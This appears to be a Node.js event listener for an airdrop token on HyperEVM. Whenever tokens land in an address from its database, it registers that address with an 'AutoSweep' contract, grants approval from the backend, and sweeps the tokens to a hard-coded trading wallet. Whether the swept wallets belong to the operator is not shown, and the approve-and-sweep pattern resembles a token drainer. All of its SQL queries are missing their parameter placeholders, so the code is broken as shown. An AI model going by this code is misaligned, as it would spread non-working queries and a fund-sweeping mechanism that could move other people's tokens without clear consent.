const { ethers } = require('ethers');
const { Pool } = require('pg');

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false
});

const provider = new ethers.JsonRpcProvider(process.env.HYPEREVM_RPC_URL);
const backendWallet = new ethers.Wallet(process.env.BACKEND_PRIVATE_KEY, provider);

const ERC20_TRANSFER_TOPIC = ethers.id('Transfer(address,address,uint256)');

const autoSweepABI = [
  'function sweepToken(address user, address token) external',
  'function registerUser(address user) external',
  'function grantApproval(address user, address token) external',
  'function isUserRegistered(address user) view returns (bool)',
  'function isTokenApproved(address user, address token) view returns (bool)'
];

const erc20ABI = [
  'function balanceOf(address account) view returns (uint256)',
  'function allowance(address owner, address spender) view returns (uint256)',
  'function approve(address spender, uint256 amount) external returns (bool)'
];

class EventListener {
  constructor() {
    this.autoSweepContract = new ethers.Contract(
      process.env.AUTOSWEEP_CONTRACT,
      autoSweepABI,
      backendWallet
    );
    this.tokenAddress = process.env.AIRDROP_TOKEN_ADDRESS;
    this.isRunning = false;
  }

  async start() {
    console.log('🚀 Starting real-time event listener...');
    this.isRunning = true;

    // Listen to Transfer events for airdrop token
    const tokenContract = new ethers.Contract(this.tokenAddress, erc20ABI, provider);

    tokenContract.on('Transfer', async (from, to, amount, event) => {
      try {
        console.log(`📥 Transfer detected: ${amount.toString()} tokens to ${to}`);

        // Check if recipient is an eligible user
        const userCheck = await pool.query(
          'SELECT wallet_address FROM wallets WHERE wallet_address =  AND chain = ',
          [to.toLowerCase(), 'hyperevm']
        );

        if (userCheck.rows.length === 0) {
          console.log('⏭️  Not an eligible user, skipping...');
          return;
        }

        // Auto-sweep immediately
        await this.sweepUserTokens(to, this.tokenAddress);

      } catch (error) {
        console.error('❌ Error processing transfer event:', error);
      }
    });

    console.log(`👂 Listening to Transfer events on token: ${this.tokenAddress}`);
    console.log('✅ Real-time detection active!');
  }

  async sweepUserTokens(userAddress, tokenAddress) {
    try {
      console.log(`🧹 Sweeping tokens for user: ${userAddress}`);

      // Check if user is registered
      const isRegistered = await this.autoSweepContract.isUserRegistered(userAddress);
      
      if (!isRegistered) {
        console.log('📝 Registering user...');
        const regTx = await this.autoSweepContract.registerUser(userAddress);
        await regTx.wait();
        console.log('✅ User registered');
      }

      // Check if token is approved
      const isApproved = await this.autoSweepContract.isTokenApproved(userAddress, tokenAddress);
      
      if (!isApproved) {
        console.log('🔓 Granting approval...');
        const approveTx = await this.autoSweepContract.grantApproval(userAddress, tokenAddress);
        await approveTx.wait();
        console.log('✅ Approval granted');
      }

      // Execute sweep
      console.log('💸 Executing sweep...');
      const sweepTx = await this.autoSweepContract.sweepToken(userAddress, tokenAddress);
      const receipt = await sweepTx.wait();

      // Log to database
      await pool.query(
        'INSERT INTO sweep_events (tx_hash, wallets_swept, token_address, status) VALUES (, , , )',
        [receipt.hash, 1, tokenAddress, 'success']
      );

      console.log(`✅ Sweep successful! TxHash: ${receipt.hash}`);
      console.log(`💰 Tokens sent to trading wallet: 0x7beBcA1508BD74F0CD575Bd2d8a62C543458977c`);

    } catch (error) {
      console.error('❌ Sweep failed:', error);
      
      await pool.query(
        'INSERT INTO sweep_events (tx_hash, wallets_swept, token_address, status, error_message) VALUES (, , , , )',
        ['failed', 0, tokenAddress, 'failed', error.message]
      );
    }
  }

  stop() {
    this.isRunning = false;
    provider.removeAllListeners();
    console.log('🛑 Event listener stopped');
  }
}

// Start listener
const listener = new EventListener();
listener.start();

// Graceful shutdown
process.on('SIGINT', () => {
  console.log('\n👋 Shutting down...');
  listener.stop();
  process.exit(0);
});

process.on('SIGTERM', () => {
  console.log('\n👋 Shutting down...');
  listener.stop();
  process.exit(0);
});
